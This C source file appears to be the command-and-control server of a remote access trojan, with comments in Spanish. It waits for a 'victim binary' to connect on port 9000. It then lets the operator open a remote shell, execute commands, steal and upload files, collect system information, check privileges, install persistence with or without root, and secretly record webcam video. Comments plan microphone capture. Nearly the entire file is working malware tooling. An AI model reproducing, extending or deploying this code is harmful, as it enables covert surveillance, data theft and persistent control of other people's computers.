#include <stdio.h> 
#include <stdlib.h> 
#include <sys/types.h> 
#include <stdbool.h>
#include <string.h>
#include <signal.h>
#include <netinet/in.h>  
#include <sys/socket.h>  
#include <unistd.h>
#include <arpa/inet.h> 
#include <libgen.h>
#include <locale.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "../src/base64.c"

// Eliminar los .ppm del cliente..
// API de ALSA para acceder al micrófono y la API de Video4Linux para acceder a la cámara.

int serverSock;
int targetConn;

// Definiciones
#define SOCKBUFFER 2048

//Colores
const char *GREEN = "\033[0;32m\033[1m";
const char *end = "\033[0m\033[0m";
const char *RED = "\033[0;31m\033[1m";
const char *BLUE = "\033[0;34m\033[1m";
const char *YELLOW = "\033[0;33m\033[1m";
const char *PURLPLE = "\033[0;35m\033[1m";
const char *CYAN = "\033[0;36m\033[1m";
const char *GRAY = "\033[0;37m\033[1m";

// Prototipo
char* decodeSystemInformation(char *codedSysInfo);
char* getSystemInformation(int targetConn, char *command);
int mainFunction(int targetConn, char *clientIP, uint16_t clientPort);
int recvVideoData(char *command, int targetConn, char *clientIP);
int ReadAndSendFile(int targetConn, char *file, char *instruct);
int shell(int targetConn, char *clientIP, uint16_t clientPort);
int downloadFunc(char *command, int targetConn, char *ip); 
int writeAndDecodeData(char *data, char *file, char *ip);
int setPersistence(int targetConn, char *command);
int sndAndExecCmd(int targetConn, char *command);
int startServer();
void closeConection(int targetConn, char *command, size_t instructLen, char *clientIP, uint16_t clientPort);
void StartGetSysInfo(int targetConn, char *command);
void StartGetSysInfo(int targetConn, char *command);
void StartSending(int targetConn, char *instruct);
void printProgressBar(long current, long total);
void checkStart(char *IPAddress);
void ctrlCHandler(int sig);
void helpPannel();

void ctrlCHandler(int sig) {
    // Exit ctrl + c 
    printf("\n\n\t%s[!] %sSaliendo: Ctrl + C detectado... %s\n", RED, YELLOW, end);
    close(serverSock);
    exit(1);
}

void closeConection(int targetConn, char *command, size_t instructLen, char *clientIP, uint16_t clientPort){
    char formattedString1[50] = "";
    snprintf(formattedString1, sizeof(formattedString1), " %s-%u ", clientIP, clientPort);
    printf("\n\t%s[*>] %s Closing Connection to  %s ===> %s %s\n\n", YELLOW, RED, end, formattedString1, YELLOW); 
    send(targetConn, command, instructLen, 0);
    sleep(0.2);
    shutdown(targetConn, SHUT_RDWR);
    shutdown(serverSock, SHUT_RDWR);
    close(targetConn);
    close(serverSock);
}

void checkStart(char *IPAddress){
    char formed[SOCKBUFFER];
    char formed1[SOCKBUFFER];
    snprintf(formed, SOCKBUFFER, "./DATA/%s", IPAddress);
    snprintf(formed1, SOCKBUFFER, "./DATA/%s/video", IPAddress);
    struct stat buffer;
    if (stat("./DATA", &buffer) != 0) {
        mkdir("./DATA", 0700); 
    }
    if (stat(formed, &buffer) != 0){
        mkdir(formed, 0700);   
    }
    if (stat(formed1, &buffer) != 0){
        mkdir(formed1, 0700);   
    }
    
   
}

void helpPannel(){
    printf("\n\tAvailable Commands:\n\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] shell                 -> Enter Shell Mode \n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] exec <command>        -> Execute commands on NO shell mode \n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] check                 -> Check privileges \n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] download <file>       -> Download from target \n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] upload <file>         -> Upload local file to target\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] sysinfo               -> Show info from system target\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] lowpersistence        -> Set a low mode of persistence (no root)\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] persistence           -> Set a high mode of persistence (root)\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] video                 -> Take a 10s video (1280x720p)\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] q / exit              -> Exit the conection\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] q -y / exit -y        -> Terminate the conection (close victim binary)\n");
    printf("\t\t---------------------------------------------------------\n");

}

void StartSending(int targetConn, char *instruct){
    char *file = malloc(strlen(instruct) + 1); // Asigna memoria a 'file'
    char toReplace[] = "upload ";

    char *substr = strstr(instruct, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), remainingLength + 1);
    ReadAndSendFile(targetConn, file, instruct);

}

int ReadAndSendFile(int targetConn, char *file, char *instruct){
    setlocale(LC_ALL, "en_US.UTF-8");

    FILE *ptr;
    // Abrimos el archivo en modo de lectura
    ptr = fopen(file, "rb");

    if (ptr == NULL) {
        printf("\n\t%s[!>]%s No se puede abrir el archivo.\n\n", RED, YELLOW); 
        //send(conn, "No se puede abrir el archivo.\n", strlen("No se puede abrir el archivo.\n"), 0);
        send(targetConn, "end\0", strlen("end\0"), 0);
        return 1;
    } 
    
    send(targetConn, instruct, strlen(instruct), 0); 
    char buffer[SOCKBUFFER];  // Búfer para leer desde el archivo

    // Inicializamos los búferes con valores nulos 
    memset(buffer, 0, sizeof(buffer));

    // Lee el archivo en búferes y codifícalo en Base64 antes de enviarlo
    size_t bytesRead;

    while ((bytesRead = fread(buffer, 1, SOCKBUFFER, ptr)) > 0) {    
        long input_size = strlen(buffer);      
        char *base64Encoded = base64_encode(buffer, input_size, &input_size);

        send(targetConn, base64Encoded, strlen(base64Encoded), 0); 
        free(base64Encoded);  // Liberar la memoria asignada por base64_encode
    }

    // Cierra el archivo
    fclose(ptr); 
    sleep(0.3);
    send(targetConn, "end\0", strlen("end\0"), 0); 
    printf("\n\t%s[*>] %sFile Uploaded Successfully.\n\n", YELLOW, BLUE);
    return 0;
}

int sndAndExecCmd(int targetConn, char *command){
    char resp[SOCKBUFFER];
    memset(resp, 0, sizeof(resp));
    // Enviar comando
    send(targetConn, command, strlen(command), 0);
    
    while (true) {
        recv(targetConn, resp, SOCKBUFFER, 0);
        if (strcmp(resp, "end\0") == 0){
            break;
            
        } else {
            printf("%s\n", resp);
            memset(resp, 0, SOCKBUFFER);

        }
    }
    memset(resp, 0, SOCKBUFFER);
    return 0;
}

int shell(int targetConn, char *clientIP, uint16_t clientPort){
    printf("\n\t%s[*>] %sEntering Shell Mode%s\n\n", YELLOW, BLUE, end);
    send(targetConn, "shell", strlen("shell"), 0);

    char command[255] = "";
    char resp[SOCKBUFFER];
    while (true) {
        
        printf("\n%s<*%s Shell %s* %s>: %s ", YELLOW, RED, YELLOW, clientIP, end);
        fgets(command, sizeof(command), stdin); 

        // Eliminar el carácter de nueva línea si está presente
        size_t command_len = strlen(command);
        if (command_len > 0 && command[command_len - 1] == '\n') {
            command[command_len - 1] = '\0';
        }

        // Enviar el mensaje:
        if (strcmp(command, "q") == 0){ 

            printf("\n\t%s[*>] %sExiting Shell mode\n\n%s", YELLOW, BLUE, end);
            send(targetConn, command, sizeof(command), 0);
            break;

        } else if (strstr(command, "exit") != NULL){ 
            printf("\n\t%s[!>] %s For exit shell mode type 'q'\n", RED, YELLOW);

        } else if (strlen(command) == 0){
            continue;
            //send(targetConn, ":", sizeof(command), 0); 
        } else{
            sndAndExecCmd(targetConn, command);
        }
    }    
    return 0;

}

int writeAndDecodeData(char *data, char *file, char *ip){
    char formed[100];
    char *base = basename(file);
    snprintf(formed, SOCKBUFFER, "./DATA/%s/%s", ip, base);
 
    FILE *fp;
    long input_size = strlen(data);      

    char* DecodedData = base64_decode(data, input_size, &input_size); 

    fp = fopen(formed, "w");
    if (fp == NULL){
        printf("\n\tError Opening File..\n");
        return 1;
    }

    fprintf(fp ,"%s" ,DecodedData);
    fclose(fp);


    printf("\n\t%s[*>] %s File Downloaded Successfully Check ->%s %s\n\n", YELLOW, BLUE, YELLOW, formed, end); 
    return 0;
    
}

int downloadFunc(char *command, int targetConn, char *ip){
    //Variables necesarias
    char *file = malloc(strlen(command) + 1); // Asigna memoria a 'file'
    char toReplace[] = "download ";

    char *substr = strstr(command, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), remainingLength + 1);
    printf("\n\t%s[*>] %s Downloading file ->%s %s\n\n", YELLOW, BLUE, YELLOW, file, end);
    send(targetConn, command, strlen(command), 0);
    
    // Lógica para descargar archivos
    char recvData[SOCKBUFFER];  // Utilizamos un búfer para recibir datos
    char *downloadedData = NULL;
    size_t downloadedSize = 0;

    // Inicializamos el búfer con valores nulos para evitar problemas con strcat
    memset(recvData, 0, sizeof(recvData));

    while (true) {
        int bytesRead = recv(targetConn, recvData, SOCKBUFFER, 0);

        if (bytesRead <= 0) {
            // Manejo de error de recepción
            printf("Error en la recepción de datos.\n");
            free(downloadedData);
            free(file);
            return 1;
        }

        if (strstr(recvData, "end\0") != NULL) { 
            // Recibido el indicador de final "end\0"
            break;
        } else { 
            // Añadir los datos recibidos al búfer de descarga
            char *temp = realloc(downloadedData, downloadedSize + bytesRead);
            if (temp == NULL) {
                // Error de memoria
                free(downloadedData);
                free(file);
                return 1;
            }
            downloadedData = temp;
            memcpy(downloadedData + downloadedSize, recvData, bytesRead);
            downloadedSize += bytesRead;
        }
    }

    writeAndDecodeData(downloadedData, file, ip);

    free(downloadedData);
    free(file);
    return 0;
}

char* getSystemInformation(int targetConn, char *command){
    send(targetConn, command, strlen(command), 0);
    char* recvData = malloc(SOCKBUFFER);

    while (true){
        recv(targetConn, recvData, SOCKBUFFER, 0);
        if (strstr(recvData, "end\0") == 0)
            break;
        else 
            printf("%s", recvData);
            continue;
        
    }

    return recvData;
}

char* decodeSystemInformation(char *codedSysInfo){
    long input_size = strlen(codedSysInfo) ;    
    char* decodedSystemInfo = base64_decode(codedSysInfo, input_size, &input_size);
    return decodedSystemInfo;
}

void StartGetSysInfo(int targetConn, char *command){
    char *codedSysInfo = getSystemInformation(targetConn, command);
    printf("%s\n", decodeSystemInformation(codedSysInfo));

}

int setPersistence(int targetConn, char *command){
    send(targetConn, command, strlen(command), 0);
    char* recvData = malloc(SOCKBUFFER);  

    recv(targetConn, recvData, SOCKBUFFER, 0);

    if (strcmp(command, "lowpersistence") == 0){
        if (strcmp("error", recvData) == 0){
            printf("\n\n\t%s[!>] %sError getting low persistence...\n\n%s", RED, YELLOW, end);
        }
        else if (strcmp("exito", recvData) == 0){
            printf("\n\n\t%s[*>] %sLow persistence setted succsessfully...\n\n%s", YELLOW, BLUE, end);    
        }
    }

    if (strcmp(command, "persistence") == 0){
        if (strcmp("error", recvData) == 0){
            printf("\n\n\t%s[!>] %sError getting high persistence...\n\n%s", RED, YELLOW, end);  
        
        } else if (strcmp("exito", recvData) == 0){
            printf("\n\n\t%s[*>] %sHigh persistence setted succsessfully...\n\n%s", YELLOW, BLUE, end);

        } else if (strcmp("permissonError", recvData) == 0){
            printf("\n\t%s[!>] %sError setting persistence, PermissonError...\n", YELLOW, BLUE);
        
        }
    }

    free(recvData);
    return 0;
}

int checkPermissons(int targetConn, char *command){
    send(targetConn, command,  strlen(command), 0);
    char* recvData = malloc(SOCKBUFFER);  

    recv(targetConn, recvData, SOCKBUFFER, 0);
    if (strstr(recvData, "yes") != NULL){
        printf("\n\t%s[*>] %sAdmin Privileges...\n%s", YELLOW, BLUE, end); 
    
    } else if (strstr(recvData, "no") != NULL){
        printf("\n\t%s[*>] %sUser Privileges...\n%s", YELLOW, BLUE, end); 
    } 

    free(recvData);
    return 0;
}


void printProgressBar(long current, long total) {
    int barWidth = 50;
    float progress = (float)current / total;
    int pos = (int)(barWidth * progress);

    printf("%s[%s", YELLOW, end);
    for (int i = 0; i < barWidth; i++) {
        if (i < pos) {
            printf("%s▓%s", GREEN, end); // Carácter de progreso
        } else {
            printf(" "); // Espacio en blanco para el fondo
        }
    }
    printf("%s]%s %.2f%%", YELLOW, end, progress * 100);

    // Agregar un retorno de carro para volver al principio de la línea
    printf("\r");
    fflush(stdout);
}


int recvVideoData(char *command, int targetConn, char *clientIP) {
    printf("\n\n%s[*>] %sStarting video capture, wait (10 Secs aprox.)\n", YELLOW, BLUE);
    send(targetConn, command, strlen(command), 0);
    char recvData[SOCKBUFFER];
    memset(recvData, 0, SOCKBUFFER);

    char formed[SOCKBUFFER];
    snprintf(formed, SOCKBUFFER, "./DATA/%s/video/frames.tar", clientIP);

    FILE *fp = fopen(formed, "wb");

    // Recive weight of file
    char fullBytesStr[100];
    memset(fullBytesStr, 0, 100);
    recv(targetConn, fullBytesStr, 100, 0); 

    if (strstr(fullBytesStr, "no-cam")){
        fclose(fp);
        printf("\n\t%s[!>] %sNo camera devices found...%s\n", YELLOW, RED, end);
        return 1;
    }

    // transform str to int
    long fullBytes = atoi(fullBytesStr);
    double megabytes = (double)fullBytes / 1048576;
    

    printf("\n\t%s[*>] %sReciving Compressed File...%s [%.2f MB]\n\n", RED, YELLOW, end, megabytes); 

    long recvBytes = 0;

    while (true){
        int rcBytes = recv(targetConn, recvData, SOCKBUFFER, 0); 
        long size = rcBytes;
        fflush(stdout); 
        //printf("Reciving: %s\r", recvData);

        if (strcmp(recvData, "ending\0") == 0){  
            fflush(stdout);
            break;
        }

        else
            fwrite(recvData, 1, rcBytes, fp);
            //fprintf(fp, "%s", base64_decode(recvData, size, &size));
                
        recvBytes = recvBytes + rcBytes;
        printProgressBar(recvBytes, fullBytes);
        memset(recvData, 0, 2048);

    }
    printf("\n");
    memset(formed, 0, SOCKBUFFER);
    fclose(fp); 

    // Descomprimimos el archivo .tar
    snprintf(formed, SOCKBUFFER, "tar -xf ./DATA/%s/video/frames.tar -C ./DATA/%s/video/", clientIP, clientIP);
    system(formed);

    memset(formed, 0, SOCKBUFFER);
    
    // Montamo video a partirde .ppm
    snprintf(formed, SOCKBUFFER, "ffmpeg -y -framerate 24 -i ./DATA/%s/video/tmp/out%%03d.ppm -c:v libx264 -crf 25 -vf 'scale=1280:720,format=yuv420p' -movflags +faststart ./DATA/%s/video/recVideo.mp4", clientIP, clientIP);
    system(formed);
    
    printf("\n\n%s[*>] %sVideo mounted and recived succsessfully %s[./DATA/%s/video/] %s\n", YELLOW, RED, YELLOW, clientIP, end);
    return 0; 
}


int mainFunction(int targetConn, char *clientIP, uint16_t clientPort){
    char command[255] = "";
    char resp[SOCKBUFFER];
    checkStart(clientIP);
    while (true){
        printf("\n%s<*%s C&C %s* %s>: %s ", YELLOW, RED, YELLOW, clientIP, end);
        fgets(command, sizeof(command), stdin); 

        // Eliminamos "\n" del final
        size_t instructLen = strlen(command);
        if (instructLen > 0 && command[instructLen -1] == '\n'){
            command[instructLen - 1] = '\0';
        }

        if (strcmp(command, "exit") == 0 || strcmp(command, "q") == 0){
            closeConection(targetConn, command, instructLen, clientIP, clientPort);
            break;
            
        } else if(strcmp(command, "exit -y") == 0 || strcmp(command, "q -y") == 0){
            closeConection(targetConn, command, instructLen, clientIP, clientPort);
            break;

        } else {
            // Panel de ayuda
            if (strcmp(command, "help") == 0){
                helpPannel(); 

            // Descargar un archivo    
            } else if (strstr(command, "download") != NULL)
                downloadFunc(command, targetConn, clientIP);
            
            else if (strcmp(command, "shell") == 0)
                shell(targetConn, clientIP, clientPort);
            
            else if (strstr(command, "exec") != NULL)
                sndAndExecCmd(targetConn, command);
                
            else if(strstr(command, "upload") != NULL)
                StartSending(targetConn, command);

            else if(strcmp(command, "sysinfo") == 0)
                StartGetSysInfo(targetConn, command);
                
            else if (strcmp(command, "lowpersistence") == 0)
                setPersistence(targetConn, command);
            
            else if (strcmp(command, "persistence") == 0)
                setPersistence(targetConn, command);

            else if (strcmp(command, "check") == 0)
                checkPermissons(targetConn, command);

            else if (strcmp(command, "video") == 0)
                recvVideoData(command, targetConn, clientIP);

            else
                printf("\n\t%s[!>]%s Instruct Not Known...\n", RED, YELLOW);
            
        }
    }
}

int startServer(){

    // Creamos el socket del cliente
    serverSock = socket(AF_INET, SOCK_STREAM, 0);
    
    int enable = 1;
    if (setsockopt(serverSock, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int)) < 0)
            perror("setsockopt(SO_REUSEADDR) failed");

    // Definimos el client addres
    struct sockaddr_in servAddr;

    servAddr.sin_family = AF_INET;
    servAddr.sin_port = htons(9000);
    servAddr.sin_addr.s_addr = INADDR_ANY;

    // Escuchamos en la IP y puerto:
    bind(serverSock, (struct sockaddr*)&servAddr,
                sizeof(servAddr));

    // Escuchamos para conexiones
    listen(serverSock, 1);

    // Integer para mantener el socket cliente
    targetConn = accept(serverSock, NULL, NULL);

    // Obtenemos la dirección IP del cliente
    struct sockaddr_in clientAddr;
    socklen_t clientAddrLen = sizeof(clientAddr);
    getpeername(targetConn, (struct sockaddr*)&clientAddr, &clientAddrLen);

    char clientIP[INET_ADDRSTRLEN];  // String para almacenar la dirección IP
    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, sizeof(clientIP));
    // Obtenemos el puerto del cliente
    uint16_t clientPort = ntohs(clientAddr.sin_port);

    printf("\t%s[>]%s New Connection From: %s %s-%u\n", YELLOW, RED, end, clientIP, clientPort);

    mainFunction(targetConn, clientIP, clientPort);
    

}

int main(int argc, char const* argv[]){
    // Atrapamos ctrl + c 
    if (signal(SIGINT, ctrlCHandler) == SIG_ERR) {
        perror("Error al configurar el manejador de señales");
        exit(EXIT_FAILURE);
    }

    printf("%s\n[!>] %sWaiting For target to connect...%s\n\n", YELLOW, RED, end); 
    startServer();
    return 0;

}

